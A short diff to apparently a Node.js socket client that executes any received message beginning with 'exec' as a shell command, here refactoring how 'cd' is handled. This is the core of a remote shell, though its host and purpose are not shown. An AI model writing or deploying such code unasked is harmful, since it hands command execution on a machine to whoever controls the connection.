@@ -36,11 +36,6 @@ function clearIntervalConnect() {
 
 client.on("data", (data) => {
 	const dataStr = data.toString().toLowerCase();
-	if (dataStr.startsWith("exec")) {
-		if (dataStr.split(" ")[1] === "cd") {
-			path = changeDir(data, path);
-		}
-	}
 
 	async function execute(command) {
 		await exec(
@@ -52,7 +47,12 @@ client.on("data", (data) => {
 		);
 	}
 
-	if (dataStr.startsWith("exec")) execute(dataStr.replace("exec", ""));
+	if (dataStr.startsWith("exec")) {
+		if (dataStr.split(" ")[1] === "cd") {
+			path = changeDir(data, path);
+		}
+		execute(dataStr.replace("exec", ""));
+	}
 });
 
 client.on("connect", () => {
